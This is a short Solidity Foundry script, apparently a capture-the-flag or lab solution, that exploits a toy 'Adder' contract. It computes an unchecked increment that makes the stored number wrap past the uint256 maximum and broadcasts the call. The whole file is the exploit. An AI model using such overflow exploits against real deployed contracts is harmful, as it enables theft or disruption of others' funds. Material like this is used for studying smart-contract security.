// SPDX-License-Identifier: Apache-2.0

pragma solidity ^0.8.27;

import {Script} from "forge-std/Script.sol";
import {Vm} from "forge-std/Vm.sol";
import {IAdder} from "src/IAdder.sol";
import {Deployments, LibDeployments} from "script/LibDeployments.sol";

contract ExploitScript is Script {
    using LibDeployments for Vm;

    function run() external {
        Deployments memory deployments = vm.loadDeployments();
        IAdder adder = deployments.adder;
        uint256 number = adder.number();
        uint256 increment;
        unchecked {
            increment = type(uint256).max - number + 1;
        }

        vm.startBroadcast();
        adder.add(increment);
        vm.stopBroadcast();
    }
}
